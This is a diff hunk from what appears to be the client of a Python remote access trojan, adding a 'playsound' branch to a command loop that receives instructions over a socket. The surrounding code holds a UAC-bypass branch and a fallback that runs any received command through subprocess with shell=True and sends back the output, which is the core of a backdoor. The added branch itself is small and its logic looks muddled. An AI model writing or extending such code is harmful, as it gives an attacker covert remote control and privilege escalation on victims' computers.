@@ -957,8 +957,16 @@ def shell():
             elif command[:10] == "bypass-uac":
                 if bypassuac() == True:
                     sys.exit()
+
                 else:
                     os.startfile(sys.executable)
+            elif command[:9] == 'playsound':
+                if s.recv(1024).decode() == 'nsupport':
+                    try:
+                        s.send('[-] This module Support only Wav files'.encode())
+                        pass
+                    except:
+                        continue
             else:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
